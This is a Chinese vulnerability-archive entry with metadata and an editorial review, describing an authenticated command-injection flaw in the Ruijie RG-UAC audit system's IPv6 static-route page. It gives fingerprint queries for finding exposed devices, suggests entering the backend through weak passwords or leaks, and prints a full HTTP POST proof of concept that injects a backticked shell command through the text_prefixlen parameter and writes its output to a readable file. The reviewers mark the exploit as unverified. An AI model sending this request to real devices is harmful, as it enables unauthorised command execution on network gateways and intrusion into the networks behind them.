---
source: "wy876 漏洞文库"
id: "vw-9484bc143d9d886f484860b9"
entity_id: "ve-9484bc143d9d886f484860b9"
schema_version: "1"
fofa_unverified: "app.name="
title: "锐捷RG-UAC统一上网行为管理审计系统text_prefixlen后台命令执行漏洞"
product: "Ruijie RG-UAC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "登录态，IPv6路由新增，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Ftext_prefixlen%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/knbwbbtehaqo6gv1"
source_status: "recorded"
---

# 锐捷RG-UAC统一上网行为管理审计系统text_prefixlen后台命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie RG-UAC
- 本文讨论：static_route_add_ipv6.php text_prefixlen命令替换
- 版本、权限与配置前提：登录态，IPv6路由新增，版本未知
- 资料类型：后台命令注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题仅参数需补实际IPv6添加入口
- ls并不证明root；未给响应/根因，网关1等业务参数条件未说明
- 路由提交副作用与固定1.txt无清理；元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 网络配置影响及执行权限待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在命令执行漏洞,可以通过漏洞获取root权限 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页


# 四、漏洞复现
使用弱口令/敏感信息泄露漏洞登录系统后台


获取Cookie后使用下面poc

```http
POST /view/networkConfig/RouteConfig/StaticRoute/static_route_add_ipv6.php HTTP/1.1
Host: 
Cookie: PHPSESSID=ae6**************************0f3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 75

text_ip_addr=0000:0000:0000::0000&text_prefixlen=`ls+>1.txt`&text_gateway=1
```


```plain
/view/networkConfig/RouteConfig/StaticRoute/1.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/knbwbbtehaqo6gv1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
